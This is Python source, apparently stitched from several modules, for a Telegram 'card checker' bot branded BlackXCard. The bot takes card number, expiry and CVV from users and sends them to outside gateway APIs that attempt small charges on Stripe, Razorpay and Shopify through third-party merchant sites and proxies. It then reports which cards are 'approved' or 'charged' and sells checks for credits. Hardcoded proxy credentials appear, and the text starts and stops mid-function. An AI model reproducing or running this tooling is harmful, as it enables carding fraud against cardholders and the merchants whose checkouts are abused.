        full_card = f"{cc}|{mm}|{yy}|{cvv}"
        escaped_card = html.escape(full_card)

        # --- Initial processing message - SIRF EGG EMOJI ---
        msg = await update.message.reply_text("⏳")

        # --- API request ---
        api_url = f"http://103.181.84.163:8080/BlackXCard.stripe1$/cc={full_card}"

        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=50) as resp:
                api_response = await resp.text()

        # --- Parse API response ---
        try:
            data = json.loads(api_response)
        except json.JSONDecodeError:
            logger.error(f"API returned invalid JSON: {api_response[:300]}")
            await msg.edit_text(
                f"❌ Invalid API response:\n<code>{html.escape(api_response[:500])}</code>",
                parse_mode=ParseMode.HTML
            )
            return

        # --- Extract response from nested JSON ---
        response_data = data.get("response", "{}")
        
        # Parse nested JSON in response field
        try:
            nested_response = json.loads(response_data)
            error_message = nested_response.get("errors", "Unknown error")
        except:
            error_message = str(response_data)

        # --- Determine status from error message ---
        error_lower = str(error_message).lower()
        
        if "declined" in error_lower:
            header_status = "❌ DECLINED"
            display_response = "Card was declined"
        elif "incorrect" in error_lower or "invalid" in error_lower:
            header_status = "❌ DECLINED"
            display_response = "Invalid card details"
        elif "success" in error_lower or "approved" in error_lower:
            header_status = "✅ 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿"
            display_response = "Payment approved"
        elif "insufficient" in error_lower:
            header_status = "❌ DECLINED"
            display_response = "Insufficient funds"
        else:
            header_status = "❌ DECLINED"
            display_response = str(error_message)

        # --- BIN lookup ---
        try:
            bin_number = cc[:6]
            bin_details = await get_bin_info(bin_number)
            brand = (bin_details.get("scheme") or "N/A").title()
            issuer = bin_details.get("bank") or "N/A"
            country_name = bin_details.get("country") or "Unknown"
            country_flag = bin_details.get("country_emoji", "")
        except Exception as e:
            logger.warning(f"BIN lookup failed for {bin_number}: {e}")
            brand = issuer = "N/A"
            country_name = "Unknown"
            country_flag = ""

        # --- Developer branding ---
        DEVELOPER_NAME = "𝘽𝙡𝙖𝙘𝙠𝙓𝘾𝙖𝙧𝙙 ⸙ ™"
        DEVELOPER_LINK = "tg://resolve?domain=BlinkCarder"
        developer_clickable = f'<a href="{DEVELOPER_LINK}">{DEVELOPER_NAME}</a>'

        # --- Time elapsed ---
        elapsed_time = round(time.time() - start_time, 2)

        # --- Final formatted message ---
        final_text = (
            f"<b><i>{header_status}</i></b>\n\n"
            f"𝐂𝐚𝐫𝐝\n"
            f"⤷ <code>{escaped_card}</code>\n"
            f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝙎𝙩𝙧𝙞𝙥𝙚 𝟭$\n"
            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i><code>{html.escape(display_response)}</code></i>\n\n"
            f"<pre>"
            f"𝐁𝐫𝐚𝐧𝐝 ➵ {html.escape(brand)}\n"
            f"𝐁𝐚𝐧𝐤 ➵ {html.escape(issuer)}\n"
            f"𝐂𝐨𝐮𝐧𝙩𝙧𝙮 ➵ {html.escape(country_name)} {country_flag}"
            f"</pre>\n\n"
            f"𝐃𝐄𝐕 ➵ {developer_clickable}\n"
            f"𝐄𝐥𝐚𝐩𝐬𝐞𝐝 ➵ {elapsed_time}s"
        )

        await msg.edit_text(
            final_text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

    except Exception as e:
        logger.exception("Error in processing /st")
        try:
            await update.message.reply_text(
                f"❌ Error: <code>{html.escape(str(e))}</code>",
                parse_mode=ParseMode.HTML
            )
        except Exception:
            pass
            

            
# --- Main /sh command ---
import re
import asyncio
import html
from telegram.constants import ParseMode
from telegram import Update
from telegram.ext import ContextTypes

# Flexible regex: allows |, /, :, or spaces as separators
ST_CARD_REGEX = re.compile(
    r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b"
)

async def st_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    # --- Cooldown check ---
    if not await enforce_cooldown(user.id, update):
        return

    card_input = None

    # --- Check arguments ---
    if context.args:
        raw_text = " ".join(context.args).strip()
        match = ST_CARD_REGEX.search(raw_text)
        if match:
            card_input = match.groups()

    # --- If no args, check reply message ---
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        match = ST_CARD_REGEX.search(update.message.reply_to_message.text)
        if match:
            card_input = match.groups()

    # --- If still no payload ---
    if not card_input:
        await update.message.reply_text(
            "⚠️ Usage: <code>/st card|mm|yy|cvv</code>\n"
            "Or reply to a message containing a card.",
            parse_mode=ParseMode.HTML
        )
        return

    # --- Normalize ---
    card, mm, yy, cvv = card_input
    mm = mm.zfill(2)
    yy = yy[-2:] if len(yy) == 4 else yy
    payload = f"{card}|{mm}|{yy}|{cvv}"

    # --- Run in background ---
    asyncio.create_task(process_st(update, context, payload))





import aiohttp
import asyncio
import json
import logging
import re
import time
from html import escape
from datetime import datetime
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

from db import get_user, update_user
from bin import get_bin_info

logger = logging.getLogger(__name__)

# --- User cooldowns ---
user_cooldowns = {}

async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 5) -> bool:
    """Prevent spam by enforcing a cooldown per user."""
    last_run = user_cooldowns.get(user_id, 0)
    now = datetime.now().timestamp()
    if now - last_run < cooldown_seconds:
        await update.effective_message.reply_text(
            f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - last_run, 2)}s."
        )
        return False
    user_cooldowns[user_id] = now
    return True

async def consume_credit(user_id: int) -> bool:
    """Consume 1 credit from DB user if available."""
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False

# --- Razorpay Processor ---
async def process_rz(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
    """
    Process a /rz command: check Razorpay 1rs charge, display response and BIN info.
    """
    start_time = time.time()
    try:
        user = update.effective_user

        # --- Consume credit ---
        if not await consume_credit(user.id):
            await update.message.reply_text("❌ You don’t have enough credits left.")
            return

        # --- Extract card details ---
        parts = payload.split("|")
        if len(parts) != 4:
            await update.message.reply_text(
                "❌ Invalid format.\nUse: /rz 1234567812345678|12|2028|123",
                parse_mode=ParseMode.HTML
            )
            return

        cc, mm, yy, cvv = [p.strip() for p in parts]
        full_card = f"{cc}|{mm}|{yy}|{cvv}"

        # --- Initial processing message ---
        processing_text = (
            f"<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳</code></pre>\n"
            f"<pre><code>{escape(full_card)}</code></pre>\n"
            f"<b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝐑𝐚𝐳𝐨𝐫𝐩𝐚𝐲 1₹</b>\n"
        )

        processing_msg = await update.message.reply_text(
            processing_text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

        # --- API request ---
        api_url = (
            f"https://rockyrockss.onrender.com/api/razorpay/pay?cc={full_card}"
        )

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(api_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=50) as resp:
                    api_response = await resp.text()
        except asyncio.TimeoutError:
            await processing_msg.edit_text("❌ Error: API request timed out.", parse_mode=ParseMode.HTML)
            return
        except Exception as e:
            await processing_msg.edit_text(
                f"❌ API request failed: <code>{escape(str(e))}</code>",
                parse_mode=ParseMode.HTML
            )
            return

        # --- Parse API response ---
        try:
            data = json.loads(api_response)
        except json.JSONDecodeError:
            await processing_msg.edit_text(
                f"❌ Invalid API response:\n<code>{escape(api_response[:500])}</code>",
                parse_mode=ParseMode.HTML
            )
            return

        response_description = data.get("description", "No description")
        proxy_ip = data.get("proxy_ip", "Direct Connection")
        proxy_status = data.get("proxy_status", "N/A")
        gateway_label = "Razorpay 1₹"

        # --- BIN lookup ---
        try:
            bin_number = cc[:6]
            bin_details = await get_bin_info(bin_number) or {}
            brand = (bin_details.get("scheme") or "N/A").title()
            issuer = bin_details.get("bank", {}).get("name") if isinstance(bin_details.get("bank"), dict) else bin_details.get("bank", "N/A")
            country_name = bin_details.get("country", {}).get("name") if isinstance(bin_details.get("country"), dict) else bin_details.get("country", "Unknown")
            country_flag = bin_details.get("country_emoji", "")
        except Exception:
            brand = issuer = "N/A"
            country_name = "Unknown"
            country_flag = ""

        # --- Determine status emoji ---
        lower_resp = response_description.lower()
        if re.search(r"\b(approved|charged|success|authorization)\b", lower_resp):
            header_status = "✅ Charged"
        elif "3dsecure" in lower_resp:
            header_status = "❌ Declined (3DS Not Enabled)"
        elif "cancelled" in lower_resp or "declined" in lower_resp or "insufficient" in lower_resp:
            header_status = "❌ Declined"
        elif "Payment processing failed" in lower_resp or "failed" in lower_resp or "insufficient" in lower_resp:
            header_status = "❌ Declined"
        elif "refund" in lower_resp or "days" in lower_resp or "did not go" in lower_resp:
            header_status = "❎ Declined"
        else:
            header_status = "ℹ️ Info"

        # --- Time elapsed ---
        elapsed_time = round(time.time() - start_time, 2)

        # --- Developer Branding ---
        DEVELOPER_NAME = "𝘽𝙡𝙖𝙘𝙠𝙓𝘾𝙖𝙧𝙙 ⸙ ™"
        DEVELOPER_LINK = "tg://resolve?domain=BlinkCarder"
        developer_clickable = f'<a href="{DEVELOPER_LINK}">{DEVELOPER_NAME}</a>'

        # --- Requester ---
        full_name = " ".join(filter(None, [user.first_name, user.last_name]))
        requester = f'<a href="tg://user?id={user.id}">{escape(full_name)}</a>'

        # --- Final message ---
        final_msg = (
            f"<b><i>{header_status}</i></b>\n\n"
            f"𝐂𝐚𝐫𝐝\n"
            f"⤷ <code>{escape(full_card)}</code>\n"
            f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝐑𝐚𝐳𝐨𝐫𝐩𝐚𝐲 1₹\n"
            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i><code>{escape(response_description)}</code></i>\n\n"
            f"<pre>"
            f"𝐁𝐫𝐚𝐧𝐝 ➵ {escape(brand)}\n"
            f"𝐁𝐚𝐧𝐤 ➵ {escape(issuer)}\n"
            f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ {escape(country_name)} {country_flag}\n"
            f"</pre>\n\n"
            f"𝐃𝐄𝐕 ➵ {developer_clickable}\n"
            f"𝐄𝐥𝐚𝐩𝐬𝐞𝐝 ➵ {elapsed_time}s"
        )

        await processing_msg.edit_text(
            final_msg,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

    except Exception as e:
        logger.exception("process_rz failed")
        try:
            await update.message.reply_text(
                f"❌ Error: <code>{escape(str(e))}</code>",
                parse_mode=ParseMode.HTML
            )
        except Exception:
            pass

# --- Regex for card extraction ---
RZ_CARD_REGEX = re.compile(
    r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b"
)

# --- /rz command entry point ---
async def rz_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    # --- Cooldown check ---
    if not await enforce_cooldown(user.id, update):
        return

    card_input = None

    # --- Check arguments ---
    if context.args:
        raw_text = " ".join(context.args).strip()
        match = RZ_CARD_REGEX.search(raw_text)
        if match:
            card_input = match.groups()

    # --- If no args, check reply message ---
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        match = RZ_CARD_REGEX.search(update.message.reply_to_message.text)
        if match:
            card_input = match.groups()

    # --- If still no payload ---
    if not card_input:
        await update.message.reply_text(
            "⚠️ Usage: <code>/rz card|mm|yy|cvv</code>\n"
            "Or reply to a message containing a card.",
            parse_mode=ParseMode.HTML
        )
        return

    # --- Normalize ---
    card, mm, yy, cvv = card_input
    mm = mm.zfill(2)
    yy = yy[-2:] if len(yy) == 4 else yy
    payload = f"{card}|{mm}|{yy}|{cvv}"

    # --- Run in background ---
    asyncio.create_task(process_rz(update, context, payload))





import asyncio
import aiohttp
import time
import re
import logging
from telegram import Update
from telegram.ext import ContextTypes
from telegram.error import TelegramError, BadRequest
from db import get_user, update_user

# --- SETTINGS ---
API_URL_TEMPLATE = "https://stripe.stormx.pw/gateway=autostripe/key=darkboy/site=dilaboards.com/cc="
CONCURRENCY = 3  # Reduce concurrency to avoid rate limits
RATE_LIMIT_SECONDS = 5
user_last_command_time = {}
BULLET_GROUP_LINK = "https://t.me/+EwCcMzxhQ6Y3MTQ0"

# --- CREDIT HANDLER ---
async def deduct_credit(user_id: int) -> bool:
    try:
        user_data = await get_user(user_id)
        if user_data and user_data.get("credits", 0) > 0:
            await update_user(user_id, credits=user_data["credits"] - 1)
            return True
    except Exception as e:
        logging.error(f"[deduct_credit] Error for user {user_id}: {e}")
    return False

# --- HELPERS ---
def extract_cards(text: str) -> list[str]:
    pattern = r"\b(\d{12,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})\b"
    return [match.group(0) for match in re.finditer(pattern, text)]

def mdv2_escape(text: str) -> str:
    """Escape text for Telegram MarkdownV2 safely."""
    escape_chars = r"_*[]()~`>#+-=|{}.!"
    return "".join(f"\\{c}" if c in escape_chars else c for c in str(text))

def format_user_link(user) -> str:
    """Return a clickable Telegram user link using their name."""
    name = user.first_name
    if user.last_name:
        name += f" {user.last_name}"
    return f"[{mdv2_escape(name)}](tg://user?id={user.id})"

# --- SINGLE CARD CHECK ---
async def check_single_card(session, card: str):
    try:
        async with session.get(API_URL_TEMPLATE + card, timeout=60) as resp:
            if resp.status != 200:
                return f"`{mdv2_escape(card)}`\n𝗦𝘁𝗮𝘁𝘂𝘀 ➵ ❌ _HTTP Error {resp.status}_", "error"
            
            data = await resp.json()

        status = str(data.get("status") or data.get("Status") or "unknown").strip().lower()
        response = str(data.get("response") or data.get("Response") or "No response").strip()

        card_md = mdv2_escape(card)
        response_md = mdv2_escape(response)

        if "approved" in status:
            return f"`{card_md}`\n𝗦𝘁𝗮𝘁𝘂𝘀 ➵ ✅ _{response_md}_", "approved"
        elif "declined" in status:
            return f"`{card_md}`\n𝗦𝘁𝗮𝘁𝘂𝘀 ➵ ❌ _{response_md}_", "declined"
        else:
            return f"`{card_md}`\n𝗦𝘁𝗮𝘁𝘂𝘀 ➵ ⚠️ _{response_md}_", "error"

    except (aiohttp.ClientError, asyncio.TimeoutError):
        return f"`{mdv2_escape(card)}`\n𝗦𝘁𝗮𝘁𝘂𝘀 ➵ ❌ _Network Error_", "error"
    except Exception as e:
        return f"`{mdv2_escape(card)}`\n𝗦𝘁𝗮𝘁𝘂𝘀 ➵ ❌ _{mdv2_escape(str(e))}_", "error"

# --- RUN MASS CHECKER ---
async def run_mass_checker(msg_obj, cards, user):
    total = len(cards)
    counters = {"checked": 0, "approved": 0, "declined": 0, "error": 0}
    results = []
    start_time = time.time()

    bullet = "⩙"
    bullet_link = f"[{mdv2_escape(bullet)}]({BULLET_GROUP_LINK})"
    gateway_text = mdv2_escape("𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➵ #𝗠𝗮𝘀𝘀𝗦𝘁𝗿𝗶𝗽𝗲𝗔𝘂𝘁𝗵")
    status_text = mdv2_escape("𝗦𝘁𝗮𝘁𝘂𝘀 ➵ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 🔎...")

    # --- Initial Processing Message ---
    initial_text = (
        f"```𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳```\n"
        f"{bullet_link} {gateway_text}\n"
        f"{bullet_link} {status_text}"
    )

    try:
        msg_obj = await msg_obj.reply_text(
            initial_text,
            parse_mode="MarkdownV2",
            disable_web_page_preview=True
        )
    except BadRequest as e:
        logging.error(f"[editMessageText-init] {e.message}")
        return

    queue = asyncio.Queue()
    semaphore = asyncio.Semaphore(CONCURRENCY)

    async with aiohttp.ClientSession() as session:
        async def worker(card):
            async with semaphore:
                result_text, status = await check_single_card(session, card)
                counters["checked"] += 1
                counters[status] += 1
                await queue.put(result_text)

        tasks = [asyncio.create_task(worker(c)) for c in cards]

        async def consumer():
            nonlocal results
            while True:
                try:
                    result = await asyncio.wait_for(queue.get(), timeout=2)
                except asyncio.TimeoutError:
                    if all(t.done() for t in tasks):
                        break
                    continue

                results.append(result)
                elapsed = round(time.time() - start_time, 2)

                header = (
                    f"{bullet_link} {gateway_text}\n"
                    f"{bullet_link} 𝗧𝗼𝘁𝗮𝗹 ➵ {mdv2_escape(str(counters['checked']))}/{mdv2_escape(str(total))}\n"
                    f"{bullet_link} 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ➵ {mdv2_escape(str(counters['approved']))}\n"
                    f"{bullet_link} 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ➵ {mdv2_escape(str(counters['declined']))}\n"
                    f"{bullet_link} 𝗘𝗿𝗿𝗼𝗿 ➵ {mdv2_escape(str(counters['error']))}\n"
                    f"{bullet_link} 𝗧𝗶𝗺𝗲 ➵ {mdv2_escape(str(elapsed))} Sec\n"
                    "──────── ⸙ ─────────"
                )
                content = header + "\n" + "\n──────── ⸙ ─────────\n".join(results)

                try:
                    await msg_obj.edit_text(
                        content,
                        parse_mode="MarkdownV2",
                        disable_web_page_preview=True
                    )
                except (BadRequest, TelegramError) as e:
                    logging.error(f"[editMessageText-update] {e}")

                await asyncio.sleep(0.3)

        await asyncio.gather(*tasks, consumer())

# --- MASS HANDLER ---
async def mass_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    current_time = time.time()

    # --- Cooldown ---
    if user_id in user_last_command_time:
        elapsed = current_time - user_last_command_time[user_id]
        if elapsed < RATE_LIMIT_SECONDS:
            remaining = round(RATE_LIMIT_SECONDS - elapsed, 2)
            await update.message.reply_text(
                f"⚠️ Please wait <b>{remaining}</b>s before using /mass again.",
                parse_mode="HTML"
            )
            return

    # --- Credit check ---
    if not await deduct_credit(user_id):
        await update.message.reply_text("❌ You have no credits.", parse_mode="HTML")
        return

    user_last_command_time[user_id] = current_time

    # --- Extract cards from args or replied message ---
    text_source = ""
    if context.args:
        text_source = " ".join(context.args)
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        text_source = update.message.reply_to_message.text

    cards = extract_cards(text_source)

    if not cards:
        await update.message.reply_text("🚫 No valid cards found.", parse_mode="HTML")
        return

    if len(cards) > 50:
        await update.message.reply_text(
            "⚠️ Max 50 cards allowed. Only first 50 will be processed.",
            parse_mode="HTML"
        )
        cards = cards[:50]

    # --- Build initial "Processing" message (Gateway only) ---
    bullet = "⩙"
    bullet_link = f"[{mdv2_escape(bullet)}]({BULLET_GROUP_LINK})"
    gateway_text = mdv2_escape("𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➵ #𝗠𝗮𝘀𝘀𝗦𝘁𝗿𝗶𝗽𝗲𝗔𝘂𝘁𝗵")
    status_text = mdv2_escape("𝗦𝘁𝗮𝘁𝘂𝘀 ➵ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 🔎...")

    initial_text = (
        f"```𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳```\n"
        f"{bullet_link} {gateway_text}\n"
        f"{bullet_link} {status_text}"
    )

    try:
        initial_msg = await update.message.reply_text(
            initial_text,
            parse_mode="MarkdownV2",
            disable_web_page_preview=True
        )
    except BadRequest as e:
        logging.error(f"[mass_handler-init-msg] {e}")
        return

    # --- Start mass checker ---
    asyncio.create_task(run_mass_checker(initial_msg, cards, user))






import aiohttp
import json
import logging
import asyncio
from datetime import datetime
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Import DB helpers
from db import get_user, update_user

logger = logging.getLogger(__name__)

# --- User cooldowns ---
user_cooldowns = {}

async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 5) -> bool:
    """Prevent spam by enforcing a cooldown per user."""
    last_run = user_cooldowns.get(user_id, 0)
    now = datetime.now().timestamp()
    if now - last_run < cooldown_seconds:
        await update.effective_message.reply_text(
            f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)}s."
        )
        return False
    user_cooldowns[user_id] = now
    return True

async def consume_credit(user_id: int) -> bool:
    """Consume 1 credit from DB user if available."""
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False
# --- Shopify Processor ---
import asyncio
import aiohttp
import json
import logging
from html import escape
from telegram import Update
from telegram.ext import ContextTypes
from telegram.constants import ParseMode
import re

logger = logging.getLogger(__name__)

# --- HC Processor ---
import urllib.parse

AUTOSH_BASE = "https://autoshopify.stormx.pw/index.php"
HC_PROXY = "pl-tor.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2"

async def process_hc(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
    """
    Process a /hc command: check HC card, display response and BIN info.
    Gateway label = Shopify, Price = 10$
    """
    import time
    start_time = time.time()
    processing_msg = None

    try:
        user = update.effective_user

        # --- Consume credit ---
        if not await consume_credit(user.id):
            await update.message.reply_text("❌ You don’t have enough credits left.")
            return

        # --- Extract card details ---
        parts = payload.split("|")
        if len(parts) != 4:
            await update.message.reply_text(
                "❌ Invalid format.\nUse: `/hc 1234567812345678|12|2028|123`",
                parse_mode=ParseMode.MARKDOWN_V2
            )
            return

        cc, mm, yy, cvv = [p.strip() for p in parts]
        full_card = f"{cc}|{mm}|{yy}|{cvv}"
        escaped_card = html.escape(full_card)

        # --- Clickable bullet ---
        BULLET_GROUP_LINK = "https://t.me/+EwCcMzxhQ6Y3MTQ0"
        bullet_link = f'<a href="{BULLET_GROUP_LINK}">⩙</a>'

        # --- Initial processing message ---
        processing_text = (
            f"<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳</code></pre>\n"
            f"<pre><code>{escaped_card}</code></pre>\n\n"
            f"<b>Gateway ➵ 𝙎𝙝𝙤𝙥𝙞𝙛𝙮 𝟭𝟬$</b>\n"
        )

        processing_msg = await update.message.reply_text(
            processing_text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

# --- API request ---
        encoded_card = urllib.parse.quote_plus(full_card)
        encoded_proxy = urllib.parse.quote_plus(HC_PROXY)
        encoded_site = urllib.parse.quote_plus("https://embeihold.rosecityworks.com")
        api_url = f"{AUTOSH_BASE}?site={encoded_site}&cc={encoded_card}&proxy={encoded_proxy}"

        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=50) as resp:
                api_response = await resp.text()

        # --- Parse API response ---
        try:
            data = json.loads(api_response)
        except json.JSONDecodeError:
            logger.error(f"API returned invalid JSON: {api_response[:300]}")
            await processing_msg.edit_text(
                f"❌ Invalid API response:\n<code>{html.escape(api_response[:500])}</code>",
                parse_mode=ParseMode.HTML
            )
            return

        response = data.get("Response", "Unknown")

        # --- BIN lookup ---
        try:
            bin_number = cc[:6]
            bin_details = await get_bin_info(bin_number)
            brand = (bin_details.get("scheme") or "N/A").title()
            issuer = bin_details.get("bank") or "N/A"
            country_name = bin_details.get("country") or "Unknown"
            country_flag = bin_details.get("country_emoji", "")
        except Exception as e:
            logger.warning(f"BIN lookup failed for {bin_number}: {e}")
            brand = issuer = "N/A"
            country_name = "Unknown"
            country_flag = ""

        # --- Requester ---
        full_name = " ".join(filter(None, [user.first_name, user.last_name]))
        requester = f'<a href="tg://user?id={user.id}">{html.escape(full_name)}</a>'

        # --- Developer Branding ---
        DEVELOPER_NAME = "𝘽𝙡𝙖𝙘𝙠𝙓𝘾𝙖𝙧𝙙 ⸙ ™"
        DEVELOPER_LINK = "tg://resolve?domain=BlinkCarder"
        developer_clickable = f'<a href="{DEVELOPER_LINK}">{DEVELOPER_NAME}</a>'

        # --- Determine header status + emojis ---
        header_status = "❌ Declined"
        display_response = html.escape(response)

        if re.search(r"\b(Thank You|ORDER_PLACED|approved|success|charged)\b", response, re.I):
            display_response += " ▸𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
            header_status = "🔥 Charged"
        elif "3D_AUTHENTICATION" in response.upper():
            display_response += " 🔒"
            header_status = "✅ 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿"
        elif "INCORRECT_CVC" in response.upper():
            display_response += " ✅"
            header_status = "✅ 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿"
        elif "INCORRECT_ZIP" in response.upper():
            header_status = "✅ 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿"
        elif "INSUFFICIENT_FUNDS" in response.upper():
            header_status = "✅ 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿"
        elif "CARD_DECLINED" in response.upper():
            header_status = "❌ Declined"

        # --- Time elapsed ---
        elapsed_time = round(time.time() - start_time, 2)

        # --- Final formatted message ---
        final_text = (
            f"<b><i>{header_status}</i></b>\n\n"
            f"𝐂𝐚𝐫𝐝\n"
            f"⤷ <code>{escaped_card}</code>\n"
            f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝙎𝙝𝙤𝙥𝙞𝙛𝙮 𝟭𝟬$\n"
            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i><code>{display_response}</code></i>\n\n"
            f"<pre>"
            f"𝐁𝐫𝐚𝐧𝐝 ➵ {html.escape(brand)}\n"
            f"𝐁𝐚𝐧𝐤 ➵ {html.escape(issuer)}\n"
            f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ {html.escape(country_name)} {country_flag}"
            f"</pre>\n\n"
            f"𝐃𝐄𝐕 ➵ {developer_clickable}\n"
            f"𝐄𝐥𝐚𝐩𝐬𝐞𝐝 ➵ {elapsed_time}s"
        )

        await processing_msg.edit_text(
            final_text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

    except Exception as e:
        logger.exception("Error in processing /hc")
        try:
            if processing_msg:
                await processing_msg.edit_text(
                    f"❌ Error: <code>{html.escape(str(e))}</code>",
                    parse_mode=ParseMode.HTML
                )
            else:
                await update.message.reply_text(
                    f"❌ Error: <code>{html.escape(str(e))}</code>",
                    parse_mode=ParseMode.HTML
                )
        except Exception:
            pass



import re
import asyncio
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Flexible regex: supports |, /, :, or spaces as separators
HC_CARD_REGEX = re.compile(
    r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b"
)

async def hc_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    # --- Cooldown check ---
    if not await enforce_cooldown(user.id, update):
        return

    card_input = None

    # --- Check arguments ---
    if context.args:
        raw_text = " ".join(context.args).strip()
        match = HC_CARD_REGEX.search(raw_text)
        if match:
            card_input = match.groups()

    # --- If no args, check reply message ---
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        match = HC_CARD_REGEX.search(update.message.reply_to_message.text)
        if match:
            card_input = match.groups()

    # --- If still no payload ---
    if not card_input:
        await update.message.reply_text(
            "⚠️ Usage: <code>/hc card|mm|yy|cvv</code>\n"
            "Or reply to a message containing a card.",
            parse_mode=ParseMode.HTML
        )
        return

    # --- Normalize ---
    card, mm, yy, cvv = card_input
    mm = mm.zfill(2)                   # Pad month to 2 digits
    yy = yy[-2:] if len(yy) == 4 else yy  # Reduce YYYY → YY
    payload = f"{card}|{mm}|{yy}|{cvv}"

    # --- Run in background ---
    asyncio.create_task(process_hc(update, context, payload))



import aiohttp
import json
import logging
import asyncio
from datetime import datetime
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Import DB helpers
from db import get_user, update_user

logger = logging.getLogger(__name__)

# --- User cooldowns ---
user_cooldowns = {}

async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 5) -> bool:
    """Prevent spam by enforcing a cooldown per user."""
    last_run = user_cooldowns.get(user_id, 0)
    now = datetime.now().timestamp()
    if now - last_run < cooldown_seconds:
        await update.effective_message.reply_text(
            f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)}s."
        )
        return False
    user_cooldowns[user_id] = now
    return True

async def consume_credit(user_id: int) -> bool:
    """Consume 1 credit from DB user if available."""
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False



# --- Shopify Processor ---
import asyncio
import aiohttp
import json
import logging
from html import escape
from telegram import Update
from telegram.ext import ContextTypes
from telegram.constants import ParseMode
import re

logger = logging.getLogger(__name__)

# --- HC Processor ---
import urllib.parse

AUTOSH_BASE = "https://autoshopify.stormx.pw/index.php"
ST1_PROXY = "45.38.107.97:6014:fvbysspi:bsbh3trstb1c"
ST1_SITE = "https://vasileandpavel.com"

async def process_st1(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
    """
    Process a /st1 command: check Stripe charge, display response and BIN info.
    Gateway label = Stripe, Price = 3$
    """
    import time
    start_time = time.time()
    processing_msg = None

    try:
        user = update.effective_user

        # --- Consume credit ---
        if not await consume_credit(user.id):
            await update.message.reply_text("❌ You don’t have enough credits left.")
            return

        # --- Extract card details ---
        parts = payload.split("|")
        if len(parts) != 4:
            await update.message.reply_text(
                "❌ Invalid format.\nUse: `/st1 1234567812345678|12|2028|123`",
                parse_mode=ParseMode.MARKDOWN_V2
            )
            return

        cc, mm, yy, cvv = [p.strip() for p in parts]
        full_card = f"{cc}|{mm}|{yy}|{cvv}"
        escaped_card = html.escape(full_card)

        # --- Clickable bullet ---
